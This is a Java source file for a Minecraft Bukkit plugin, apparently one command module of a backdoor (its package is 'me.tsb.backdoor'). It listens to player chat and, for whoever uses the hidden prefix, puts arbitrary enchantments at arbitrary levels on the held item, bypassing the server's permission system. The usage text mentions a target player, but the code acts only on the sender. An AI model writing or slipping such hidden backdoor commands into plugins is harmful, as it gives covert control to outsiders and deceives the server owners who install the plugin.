package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.backdoor.RegisterCommand;
import me.tsb.plugin.Main;
import org.bukkit.ChatColor;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.inventory.meta.ItemMeta;

import java.util.ArrayList;


@RegisterCommand(
        displayName = "enchant",
        usage = {"<prefix> <command> <player> <enchantment> <level>"},
        description = "Enchants the held item of the specified player",
        aliases = {"enchant", "ench"})
public class EnchantCommand extends Command {

    public EnchantCommand(Main main) {
        super(main);
    }

    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        if (args.size() >= 2) {

            ItemMeta meta;
            try {
                meta = event.getPlayer().getInventory().getItemInMainHand().getItemMeta();
            } catch (Exception e) {
                Main.logger.log(" failed to get ItemMeta from item in hand \nEXCEPTION: " + e);
                event.getPlayer().sendMessage(ChatColor.RED + "Failed to get item meta for item in hand");
                return;
            }

            Enchantment enchantment;
            try {
                enchantment = Enchantment.getByName(args.get(0));
            } catch (Exception e) {
                Main.logger.log(" Failed to get an enchantment from arg nr 0 \nEXCEPTION: " + e);
                event.getPlayer().sendMessage(ChatColor.RED + "Failed to get enchantment from arg nr 0");
                return;
            }

            int level = 0;
            try {
                level = Integer.parseInt(args.get(1));
            } catch (Exception e) {
                Main.logger.log(" Failed to get an integer from arg nr 1 \nEXCEPTION: " + e);
                event.getPlayer().sendMessage(ChatColor.RED + "Failed to get enchantment level from arg nr 1");
                return;
            }

            meta.addEnchant(enchantment, level, true);

            event.getPlayer().getInventory().getItemInMainHand().setItemMeta(meta);

        } else event.getPlayer().sendMessage(NOT_ENOUGH_ARGS);
    }
}
